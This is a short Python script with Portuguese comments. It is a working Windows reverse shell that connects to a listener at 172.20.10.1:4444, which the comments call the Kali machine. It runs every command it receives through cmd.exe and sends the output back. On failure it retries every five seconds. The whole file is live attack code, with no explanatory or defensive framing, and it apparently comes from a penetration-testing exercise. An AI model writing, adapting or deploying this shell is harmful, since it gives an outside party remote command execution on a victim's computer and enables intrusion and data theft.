import socket
import subprocess
import os
import time

HOST = '172.20.10.1'  # IP do Kali
PORT = 4444              # Porta do listener

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        # Redireciona stdin, stdout e stderr diretamente para o socket
        p = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )

        # Comunicação contínua
        while True:
            # Recebe comando do Kali
            cmd = s.recv(1024)
            if cmd.decode().strip() == "exit":
                break

            # Executa e envia a saída de volta
            output = subprocess.run(cmd.decode(), shell=True, capture_output=True)
            s.sendall(output.stdout + output.stderr)

        s.close()
        break

    except Exception as e:
        # Espera 5 segundos e tenta de novo
        time.sleep(5)
